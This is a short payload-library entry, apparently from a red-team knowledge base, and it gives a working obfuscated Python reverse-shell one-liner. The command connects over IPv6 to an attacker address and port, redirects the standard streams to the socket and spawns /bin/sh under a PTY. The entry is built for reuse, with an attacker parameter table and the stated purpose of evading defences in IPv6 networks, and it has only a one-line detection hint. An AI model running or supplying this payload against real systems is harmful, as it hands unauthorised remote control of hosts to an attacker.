---
id: c194ba5e-af8d-4e68-b688-936995bb5f3d
type: code
language: Python
verified: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Linux
tags:
  - reverse-shell
  - python
  - ipv6
  - obfuscated
  - pty
validated: true
---

# Python-Obfuscated-IPv6-Reverse-Shell-Import-PTY

## Code

```python
python -c 'socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4242,0,2));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

## Description

Obfuscated IPv6 variant with __import__ for modules and PTY shell.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $_ATTACKER_IPV6 | Attacker's IPv6 address | dead:beef:2::125c |
| $_ATTACKER_PORT | Attacker's listening port | 4242 |

## Usage

Evasion in IPv6 setups.

## Detection

- __import__ + AF_INET6 sockets.

## Related

- [[procedures/Establish-Python-Reverse-Shell]]
